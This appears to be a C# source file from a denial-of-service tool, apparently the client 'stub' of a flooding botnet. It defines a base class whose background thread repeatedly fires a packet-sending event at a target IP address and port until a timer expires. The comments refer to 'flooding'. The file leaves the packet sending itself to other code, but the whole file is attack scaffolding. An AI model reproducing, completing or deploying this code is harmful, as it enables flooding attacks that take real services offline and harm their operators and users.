using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Stub.DoS
{
    class Base
    {
        private bool _isRunning = false;
        public DateTime _time;
        public IPAddress _address;
        public ushort _port;
        public event DoSendPackets DoSendPacketsEvent;
        public delegate void DoSendPackets(IPAddress address, ushort port);
        public Thread _workerThread;

        /// <summary>
        /// Are we currently flooding?
        /// </summary>
        public bool IsRunning
        {
            get { return _isRunning; }
            set { }
        }

        public void Start(IPAddress address, ushort port, int time)
        {
            _address = address;
            _port = port;
            _time = DateTime.Now.AddSeconds(time);
            _isRunning = true;
            _workerThread = new Thread(Worker);
            _workerThread.IsBackground = true;
            _workerThread.Start();
        }

        public void Stop()
        {
            _workerThread.Abort();
            _workerThread = null;
        }

        private void Worker()
        {
            while (DateTime.Now < _time)
            {
                if (DoSendPacketsEvent != null)
                {
                    DoSendPacketsEvent(_address, _port);
                }
            }
            _isRunning = false;
        }

        public Base()
        {

        }

        ~Base()
        {
            _workerThread.Abort();
            _workerThread = null;
        }
    }
}
